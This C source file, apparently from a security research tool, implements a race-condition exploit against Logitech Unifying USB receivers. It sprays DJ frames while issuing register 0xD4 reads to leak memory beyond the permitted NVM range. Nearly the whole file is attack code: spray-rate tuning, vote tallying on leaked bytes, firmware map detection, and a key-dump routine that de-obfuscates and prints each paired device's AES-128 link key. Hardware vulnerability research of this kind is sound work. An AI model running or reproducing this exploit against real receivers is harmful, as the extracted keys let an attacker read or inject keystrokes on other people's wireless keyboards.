/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "logitech_unifying_memory.h"

#define MEM_ROUNDS			10 // distinct p0 values tried before giving up
#define MEM_VOTES_PER_ROUND	150
#define MEM_VOTES_NOISE		48 // only when the high-byte noise has to be measured
#define MEM_MIN_HITS		2

#define MEM_SPRAY_DELAY_US		400
#define MEM_SPRAY_DELAY_MIN_US	150
#define MEM_SPRAY_DELAY_MAX_US	5000

/*	The pacing is a delay, but what the dongle feels is a RATE, and the same delay
 *	on a faster host gives a much higher one - the reference machine peaked at
 *	3500 frames/s for both sprayers together, at 26 wins/s. Past that the extra
 *	frames buy nothing and only starve the interrupt OUT endpoint that the three
 *	collections share, so the floor is raised until the measured rate comes back.
 */
#define MEM_SPRAY_MAX_FPS		4000

 /*	An error answer is NOT a lost request - it is a partial race win, and the
  *	denser the spraying the more of them. Only silence counts, and real
  *	starvation collapses to 10-20 %.
  */
#define MEM_SPRAY_BAD_PERCENT	50
#define MEM_BAD_ROUNDS			3

#define MEM_MIN_SNAP_READS_S	400 // snapshot reads/s below this = incompatible port/controller speed (the spray would saturate it)

BOOL KUNI_MEM_ReadNvmByte(HID_HANDLES* pHidPP, WORD Address, BYTE* pValue) {
	BOOL ret = FALSE;
	BYTE Parameters[3], Value[3];

	Parameters[0] = LOBYTE(Address); // p0 is the LOW byte, p1 the HIGH one
	Parameters[1] = HIBYTE(Address);
	Parameters[2] = 0x00;

	if (KUNI_FW_GetRegister(pHidPP, DEVICE_INDEX_RECEIVER, REGISTER_D4, Parameters, Value, 1000)) {
		*pValue = Value[2];
		ret = TRUE;
	}

	return ret;
}

/*	One round: n requests with p0 = k, the sprayers armed on (hi, lo). A negative
 *	hi or lo leaves that sprayer idle, which is how the high-byte noise is
 *	measured. Returns how many requests answered, error answers included, and
 *	reports the round's elapsed time in *pMs (NULL when the caller ignores it).
 */
static WORD KUNI_MEM_Tally(KUNI_MEM_HANDLE* pMem, LONG hi, LONG lo, BYTE k, WORD n, WORD Votes[0x100], ULONGLONG* pMs) {
	BYTE Parameters[3], Value[3];
	PKUNI_FW_MESSAGE pError;
	WORD i, answered = 0;
	LONG Frames;
	ULONGLONG Ms;

	Parameters[0] = k;
	Parameters[1] = 0x00; // p1 must stay 0, or the request takes the bounded path
	Parameters[2] = 0x00;

	RtlZeroMemory(Votes, 0x100 * sizeof(WORD));

	Frames = KUNI_MEM_Sprayed(pMem);
	Ms = GetTickCount64();

	pMem->Hi.DelayUs = pMem->Lo.DelayUs = pMem->SprayDelayUs;
	KUNI_SPRAY_Arm(&pMem->Hi, hi);
	KUNI_SPRAY_Arm(&pMem->Lo, lo);

	for (i = 0; i < n; i++) {
		if (KUNI_FW_GetRegisterEx(pMem->pHidPP, DEVICE_INDEX_RECEIVER, REGISTER_D4, Parameters, Value, 500, &pError)) {
			Votes[Value[2]]++;
			answered++;
		}
		else if (pError) {
			answered++;
		}
	}

	KUNI_SPRAY_Arm(&pMem->Hi, -1);
	KUNI_SPRAY_Arm(&pMem->Lo, -1);

	Ms = GetTickCount64() - Ms;
	Frames = KUNI_MEM_Sprayed(pMem) - Frames;
	pMem->Requests += n; // every iteration issued one request, answered or lost

	if (pMs) {
		*pMs = Ms;
	}

	if (Ms && (((Frames * 1000) / (LONG)Ms) > MEM_SPRAY_MAX_FPS)) {
		pMem->SprayFloorUs = min(MEM_SPRAY_DELAY_MAX_US, pMem->SprayFloorUs * 5 / 4);
		pMem->SprayDelayUs = max(pMem->SprayDelayUs, pMem->SprayFloorUs);
	}

	pMem->BadRounds = ((answered * 100) < (n * MEM_SPRAY_BAD_PERCENT)) ? (pMem->BadRounds + 1) : 0;

	return answered;
}

/*	One step uphill on wins per second, using the product of the two partial
 *	outcomes as an observable stand-in for the win rate.
 */
static void KUNI_MEM_Climb(KUNI_MEM_HANDLE* pMem, const WORD Votes[0x100], BYTE NoiseLow, BYTE NoiseHi, WORD answered, ULONGLONG Ms) {
	double Throughput;

	if (answered && Ms) {
		Throughput = (double)Votes[NoiseLow] * Votes[NoiseHi] / answered / Ms;

		if (!pMem->SprayDirection) {
			pMem->SprayDirection = -1; // start by trying to go faster
		}
		else if (Throughput < pMem->Throughput) {
			pMem->SprayDirection = -pMem->SprayDirection;
		}

		pMem->Throughput = Throughput;
		pMem->SprayDelayUs = (pMem->SprayDirection > 0)
			? min(MEM_SPRAY_DELAY_MAX_US, pMem->SprayDelayUs * 5 / 4)
			: max(pMem->SprayFloorUs, pMem->SprayDelayUs * 4 / 5);
	}
}

/*	memory[Base + hi * 256 + k]. Inside the NVM - which it is for the whole key
 *	page - it is just a byte of the copy taken at open time. Otherwise it has to
 *	be measured, and it is cached per high byte.
 */
static BOOL KUNI_MEM_HiNoise(KUNI_MEM_HANDLE* pMem, BYTE hi, BYTE k, BYTE* pNoise) {
	BOOL ret;
	WORD Address = (WORD)(pMem->Base + hi * 0x100 + k), Votes[0x100], i, best;

	if (KUNI_MEM_InNvm(pMem, Address)) {
		*pNoise = KUNI_MEM_Nvm(pMem, Address);
		ret = TRUE;
	}
	else {
		if (pMem->HiNoiseFor != hi) {
			RtlZeroMemory(pMem->HiNoiseOk, sizeof(pMem->HiNoiseOk));
			pMem->HiNoiseFor = hi;
		}

		if (!pMem->HiNoiseOk[k]) {
			KUNI_MEM_Tally(pMem, hi, -1, k, MEM_VOTES_NOISE, Votes, NULL);
			Votes[KUNI_MEM_Record(pMem, k)] = 0; // the "neither landed" answer

			for (i = 0, best = 0; i < 0x100; i++) {
				if (Votes[i] > best) {
					best = Votes[i];
					pMem->HiNoise[k] = (BYTE)i;
					pMem->HiNoiseOk[k] = TRUE;
				}
			}
		}

		*pNoise = pMem->HiNoise[k];
		ret = pMem->HiNoiseOk[k];
	}

	return ret;
}

BOOL KUNI_MEM_ReadByte(KUNI_MEM_HANDLE* pMem, WORD Address, BYTE* pValue) {
	WORD Offset = Address - pMem->Base, Low, Votes[0x100], Total[0x100] = { 0 }, i, Answered;
	BYTE Seen[0x100] = { 0 }, hi = HIBYTE(Offset), lo = LOBYTE(Offset), k, NoiseLow = 0, NoiseHi = 0;
	BOOL ret = FALSE, bNoiseLow, bNoiseHi;
	ULONGLONG Ms;

	if (!hi && (lo < 0x10)) { // the request already lands there without any race
		*pValue = KUNI_MEM_Record(pMem, lo);
		ret = TRUE;
		goto done;
	}

	Low = (WORD)(pMem->Base + lo);
	bNoiseLow = KUNI_MEM_InNvm(pMem, Low);
	if (bNoiseLow) {
		NoiseLow = KUNI_MEM_Nvm(pMem, Low);
	}

	for (k = 0; k < MEM_ROUNDS; k++) {
		if (pMem->Ticking) {
			kprintf(L"."); // health check only (KUNI_MEM_SelfTest): one dot per round so the wait shows; the key dump stays clean hex
		}

		bNoiseHi = KUNI_MEM_HiNoise(pMem, hi, k, &NoiseHi);

		Answered = KUNI_MEM_Tally(pMem, hi, lo, k, MEM_VOTES_PER_ROUND, Votes, &Ms);

		/*	Grinding on with a dongle that no longer answers produces
		 *	confident-looking garbage: stop rather than trust it.
		 */
		if (Answered < (MEM_VOTES_PER_ROUND / 2)) {
			PRINT_ERROR(L"the dongle stopped answering\n");
			goto done;
		}
		if (pMem->BadRounds >= MEM_BAD_ROUNDS) {
			PRINT_ERROR(L"%li rounds in a row lost requests, the dongle needs a replug\n", pMem->BadRounds);
			goto done;
		}

		if (bNoiseLow && bNoiseHi) {
			KUNI_MEM_Climb(pMem, Votes, NoiseLow, NoiseHi, Answered, Ms);
		}

		Votes[KUNI_MEM_Record(pMem, k)] = 0;
		if (bNoiseLow) {
			Votes[NoiseLow] = 0;
		}
		if (bNoiseHi) {
			Votes[NoiseHi] = 0;
		}

		for (i = 0; i < 0x100; i++) {
			if (Votes[i]) {
				Total[i] = (WORD)(Total[i] + Votes[i]);
				Seen[i]++;

				/*	Two different p0, always: the round where the target equals
				 *	the high-byte noise filters the right answer out, and any
				 *	stray byte would then win by default.
				 */
				if ((Seen[i] >= 2) && (Total[i] >= MEM_MIN_HITS)) {
					*pValue = (BYTE)i;
					ret = TRUE;
					goto done;
				}
			}
		}
	}

	for (i = 0, k = 0; i < 0x100; i++) { // seen in a single round, best effort
		if (Total[i] > Total[k]) {
			k = (BYTE)i;
		}
	}
	if (Total[k]) {
		*pValue = k;
		ret = TRUE;
		goto done;
	}

	/*	Nothing confirmed and no single-round survivor: on a port the speed gate has
	 *	vetted, that is a byte the race cannot resolve (target == memory[Base + lo]),
	 *	not a slow controller. Fail rather than guess - no deduced-NoiseLow fallback.
	 */

done:
	return ret;
}

/*	An NVM byte that needs the race but whose value is known, and whose four race
 *	outcomes land on four different values so the tally can be read.
 *
 *	/!\ The high-byte noise is memory[High + p0], so it walks MEM_ROUNDS
 *	CONSECUTIVE bytes as p0 sweeps - checking only p0 = 0 picks addresses where
 *	nine rounds out of ten filter the answer away as noise.
 */
static BOOL KUNI_MEM_PickProbe(KUNI_MEM_HANDLE* pMem, WORD From, WORD* pAddress, BYTE* pWanted) {
	BOOL ret = FALSE;
	WORD Address, Offset, Low, High;
	BYTE Wanted, k, clean;

	for (Address = From; Address < (pMem->NvmFirst + MEM_NVM_SIZE); Address++) {
		Offset = (WORD)(Address - pMem->Base);
		Low = (WORD)(pMem->Base + LOBYTE(Offset));
		High = (WORD)(pMem->Base + HIBYTE(Offset) * 0x100);

		if (!HIBYTE(Offset) || !KUNI_MEM_InNvm(pMem, Low) || !KUNI_MEM_InNvm(pMem, High) || !KUNI_MEM_InNvm(pMem, (WORD)(High + MEM_ROUNDS - 1))) {
			continue;
		}

		Wanted = KUNI_MEM_Nvm(pMem, Address);
		if (Wanted == KUNI_MEM_Nvm(pMem, Low)) {
			continue; // that noise does not move with p0: no round could see it
		}

		for (k = 0, clean = 0; k < MEM_ROUNDS; k++) {
			if ((Wanted != KUNI_MEM_Nvm(pMem, (WORD)(High + k))) && (Wanted != KUNI_MEM_Record(pMem, k))) {
				clean++;
			}
		}
		if (clean < 3) {
			continue;
		}

		*pAddress = Address;
		*pWanted = Wanted;

		ret = TRUE;
		break;
	}

	return ret;
}

/*	Reads a handful of NVM bytes both the bounded way and through the race and compares:
 *	the base is right and the dongle still answers. KUNI_MEM_HealthCheck narrates it as the
 *	pre-check (choosing the base) and the post-check (after the dump); nothing else calls it.
 */
static BOOL KUNI_MEM_SelfTest(KUNI_MEM_HANDLE* pMem) {
	WORD Address = pMem->NvmFirst;
	BYTE Wanted, Got;
	int tried, ok;

	pMem->Ticking = TRUE; // HealthCheck printed the label; each round dots here; HealthCheck then prints the verdict
	for (tried = 0, ok = 0; (tried < 3) && KUNI_MEM_PickProbe(pMem, Address, &Address, &Wanted); tried++, Address++) {
		if (KUNI_MEM_ReadByte(pMem, Address, &Got) && (Got == Wanted)) {
			ok++;
		}
	}
	pMem->Ticking = FALSE;

	return (tried >= 2) && (ok == tried);
}

/*	The one health check, printed identically for the pre-check (base validation, in
 *	KUNI_MEM_FindBase) and the post-check (after the key dump). Label must be 10 chars wide
 *	("pre-check ", "post-check") so the record line stays aligned between the two.
 */
static BOOL KUNI_MEM_HealthCheck(KUNI_MEM_HANDLE* pMem, PCWSTR Label) {
	BOOL ret;

	kprintf(L"  [M] %s (NVM record 0x%02x at 0x%04hx) ", Label, MEM_NVM_RECORD_ORDER, pMem->Base);
	ret = KUNI_MEM_SelfTest(pMem);
	kprintf(ret ? L" OK\n" : L" **NOT** OK\n");

	return ret;
}

/*	Two firmware maps: RQR12.11 keeps the store at 0x6400, RQR12.10 (no-RSA bootloader) at
 *	0x6c00. The bounded 0xD4 path only answers for its own range, so one probe at each base
 *	tells them apart with no race, before the store is read.
 */
static BOOL KUNI_MEM_DetectMap(KUNI_MEM_HANDLE* pMem) {
	BOOL ret = TRUE;
	BYTE probe;

	if (KUNI_MEM_ReadNvmByte(pMem->pHidPP, MEM_NVM_FIRST_SIGNED, &probe)) {
		pMem->NvmFirst = MEM_NVM_FIRST_SIGNED;
	}
	else if (KUNI_MEM_ReadNvmByte(pMem->pHidPP, MEM_NVM_FIRST_UNSIGNED, &probe)) {
		pMem->NvmFirst = MEM_NVM_FIRST_UNSIGNED;
	}
	else {
		PRINT_ERROR(L"device-data store not at 0x%04x or 0x%04x\n", MEM_NVM_FIRST_SIGNED, MEM_NVM_FIRST_UNSIGNED);
		ret = FALSE;
	}

	if (ret) {
		kprintf(L"  [M] store 0x%04hx, keys 0x%04hx (%s bootloader map)\n", pMem->NvmFirst,
			KUNI_MEM_KeyPage(pMem), (pMem->NvmFirst == MEM_NVM_FIRST_SIGNED) ? L"signed" : L"unsigned");
	}

	return ret;
}

static BOOL KUNI_MEM_ReadNvm(KUNI_MEM_HANDLE* pMem) {
	BOOL ret = TRUE;
	WORD Address;
	ULONGLONG Ms = GetTickCount64();

	// a thousand bounded reads then a self-test: several silent seconds, so tick as they land
	kprintf(L"  [M] reading NVM 0x%04hx-0x%04hx, bounded path, no race ", pMem->NvmFirst, (WORD)(pMem->NvmFirst + MEM_NVM_SIZE - 1));

	for (Address = pMem->NvmFirst; ret && (Address < pMem->NvmFirst + MEM_NVM_SIZE); Address++) {
		if (KUNI_MEM_ReadNvmByte(pMem->pHidPP, Address, &KUNI_MEM_Nvm(pMem, Address))) {
			pMem->Requests++;
			if (((Address - pMem->NvmFirst) & 0x3f) == 0x3f) {
				kprintf(L".");
			}
		}
		else {
			kprintf(L"\n");
			PRINT_ERROR(L"0x%04hx unreadable through the bounded path\n", Address);
			ret = FALSE;
		}
	}

	if (ret) {
		LONGLONG rate;

		Ms = GetTickCount64() - Ms;
		// reads/s reads the port's OUT health cheaply: ~125/s = the 8 ms floor, ~500/s = ordinary latency
		rate = Ms ? (MEM_NVM_SIZE * 1000LL / (LONGLONG)Ms) : 0;
		pMem->SnapRate = rate; // KUNI_MEM_Open gates on it before the costly self-test
		kprintf(L" %u reads in %.1f s (%lld reads/s)\n", MEM_NVM_SIZE, Ms / 1000.0, rate);
	}

	return ret;
}

/*	Which copy 0x1bb4 returns when several records share the tag is not worth
 *	guessing: every candidate is tried and the one that self-tests wins.
 */
static BOOL KUNI_MEM_FindBase(KUNI_MEM_HANDLE* pMem) {
	BOOL ret = FALSE;
	WORD Address;

	for (Address = (WORD)(pMem->NvmFirst + MEM_NVM_SIZE - 0x10); !ret && Address >= pMem->NvmFirst; Address -= 0x10) {
		if (KUNI_MEM_Nvm(pMem, Address) == MEM_NVM_RECORD_ORDER) {
			pMem->Base = Address;
			pMem->HiNoiseFor = 0xffff;

			if (KUNI_MEM_HealthCheck(pMem, L"pre-check ")) {
				ret = TRUE;
			}
		}
	}

	if (!ret) {
		PRINT_ERROR(L"no usable 0x%02x record in 0x%04hx-0x%04hx\n", MEM_NVM_RECORD_ORDER, pMem->NvmFirst, (WORD)(pMem->NvmFirst + MEM_NVM_SIZE - 1));
	}

	return ret;
}

BOOL KUNI_MEM_Open(KUNI_MEM_HANDLE* pMem, HID_HANDLES* pHidPP) {
	BOOL ret = FALSE;

	RtlZeroMemory(pMem, sizeof(*pMem));
	pMem->pHidPP = pHidPP;
	pMem->SprayDelayUs = MEM_SPRAY_DELAY_US;
	pMem->SprayFloorUs = MEM_SPRAY_DELAY_MIN_US;
	pMem->OpenTick = GetTickCount64();

	if (KUNI_DJ_FindDevice(&pMem->Dj)) {
		if (KUNI_SPRAY_Start(&pMem->Hi, pMem->Dj.hDevice, pMem->Dj.Output.ByteLength, MEM_TOCTOU_OFFSET_HI, pMem->SprayDelayUs)
			&& KUNI_SPRAY_Start(&pMem->Lo, pMem->Dj.hDevice, pMem->Dj.Output.ByteLength, MEM_TOCTOU_OFFSET_LO, pMem->SprayDelayUs)) {
			if (KUNI_MEM_DetectMap(pMem) && KUNI_MEM_ReadNvm(pMem)) {
				// the snapshot already priced the port: too slow means the spray would saturate the controller, so stop before arming it
				if (pMem->SnapRate && (pMem->SnapRate < MEM_MIN_SNAP_READS_S)) {
					PRINT_ERROR(L"incompatible speed: %lld reads/s (need >= %u)\n", pMem->SnapRate, MEM_MIN_SNAP_READS_S);
				}
				else ret = KUNI_MEM_FindBase(pMem);
			}
		}
	}

	if (!ret) {
		KUNI_MEM_Close(pMem);
	}

	return ret;
}

void KUNI_MEM_Close(KUNI_MEM_HANDLE* pMem) {
	ULONGLONG Ms = GetTickCount64() - pMem->OpenTick;

	KUNI_SPRAY_Stop(&pMem->Hi);
	KUNI_SPRAY_Stop(&pMem->Lo);

	kprintf(L"  [M] %li + %li frames sprayed (%li + %li lost) + %li reads = %li USB ops in %.1f s (%lld ops/s, %lld spray/s), settled at %li us\n",
		pMem->Hi.Frames, pMem->Lo.Frames, pMem->Hi.Errors, pMem->Lo.Errors, pMem->Requests, KUNI_MEM_UsbOps(pMem),
		Ms / 1000.0, Ms ? (KUNI_MEM_UsbOps(pMem) * 1000LL / (LONGLONG)Ms) : 0, Ms ? (KUNI_MEM_Sprayed(pMem) * 1000LL / (LONGLONG)Ms) : 0, pMem->SprayDelayUs);

	KUNI_DJ_CloseDevice(&pMem->Dj);
}

void KUNI_MEM_KeyDataToKey(const BYTE KeyData[0x10], BYTE Key[0x10]) {
	static const BYTE Source[0x10] = { 7, 1, 0, 3, 10, 2, 9, 14, 8, 6, 12, 5, 13, 15, 4, 11 };
	static const BYTE Mask[0x10] = { 0, 0xff, 0, 0, 0, 0xff, 0x55, 0, 0, 0, 0xff, 0, 0, 0x55, 0, 0 };
	BYTE i;

	for (i = 0; i < 0x10; i++) {
		Key[i] = KeyData[Source[i]] ^ Mask[i];
	}
}

void KUNI_MEM_DumpKeys(HID_HANDLES* pHidPP) {
	KUNI_MEM_HANDLE hMem = { 0 };
	KUNI_FW_DEVICE Devices[MEM_KEY_SLOTS];
	BYTE Slot, KeyData[0x10], Key[0x10], i;
	WORD Address;
	BOOL bOpen = FALSE;

	/*	Every record is read FIRST, spray-free: each DJ frame lands on 0x8370/0x8371,
	 *	the very scratch the pairing handlers (register 0xb5) stage their records in, so
	 *	spraying WHILE a record is read returns a well-formed answer that belongs to
	 *	another request. Only once the whole listing is captured is it safe to spray -
	 *	which is why the DJ/spray path cannot be opened before this loop.
	 */
	for (Slot = 0; Slot < MEM_KEY_SLOTS; Slot++) {
		KUNI_FW_ReadDevice(pHidPP, Slot, &Devices[Slot]);
	}

	/*	Records captured: NOW it is safe to spray, so the DJ/spray path opens ONCE, up
	 *	front - /keys knows it will extract, no reason to interleave the open with the
	 *	listing. Guard kept: a receiver with no encrypted link is never sprayed
	 *	(KUNI_MEM_Open self-tests, and a self-test is already a spray), so a mouse-only
	 *	dongle is left untouched and needs no reset.
	 */
	for (Slot = 0; Slot < MEM_KEY_SLOTS; Slot++) {
		if (Devices[Slot].bPaired && (Devices[Slot].Pairing[PAIRING_INFO_CAPABILITIES] & PAIRING_CAPABILITY_ENCRYPTED)) {
			if (!KUNI_MEM_Open(&hMem, pHidPP)) {
				goto KUNI_MEM_DumpKeys_Leave;
			}
			bOpen = TRUE;
			break;
		}
	}

	kprintf(L"Devices\n");
	for (Slot = 0; Slot < MEM_KEY_SLOTS; Slot++) {
		KUNI_FW_PrintDevice(Slot, &Devices[Slot]);

		if (!Devices[Slot].bPaired) {
			continue;
		}

		/*	The dongle already knows whether the link is encrypted, so ask it rather
		 *	than race sixteen bytes to find out - and a free slot answers 0xff where
		 *	0xff is also the noise, the one case the race cannot resolve.
		 */
		if (!(Devices[Slot].Pairing[PAIRING_INFO_CAPABILITIES] & PAIRING_CAPABILITY_ENCRYPTED)) {
			kprintf(L"    AES-128        : none, the link is not encrypted\n");
			continue;
		}

		/*	Byte by byte: a block takes ten seconds and there is no reason to watch a
		 *	blank line for all of it. No reset if a byte gives up - a normal extraction
		 *	was measured to leave the store untouched, so a failure here is the dongle
		 *	genuinely stopping, and we stop with it rather than pay a reset.
		 */
		Address = (WORD)(KUNI_MEM_KeyPage(&hMem) + MEM_KEY_STRIDE * Slot + 1);

		kprintf(L"    Key data       : ");
		for (i = 0; i < sizeof(KeyData); i++) {
			if (!KUNI_MEM_ReadByte(&hMem, (WORD)(Address + i), KeyData + i)) {
				break;
			}

			kprintf(L"%02hhx", KeyData[i]);
		}
		kprintf(L"\n");

		if (i != sizeof(KeyData)) { // a byte gave up mid-block: the dongle stopped answering, or a value the race cannot resolve
			goto KUNI_MEM_DumpKeys_Leave;
		}

		KUNI_MEM_KeyDataToKey(KeyData, Key);
		kprintf(L"    AES-128        : ");
		kprinthex(Key, sizeof(Key));
	}

KUNI_MEM_DumpKeys_Leave:

	if (bOpen) {
		if (!KUNI_MEM_HealthCheck(&hMem, L"post-check")) {
			kprintf(L"  [M] the dongle degraded during the dump (replug it)\n");
		}

		KUNI_MEM_Close(&hMem);
	}
}
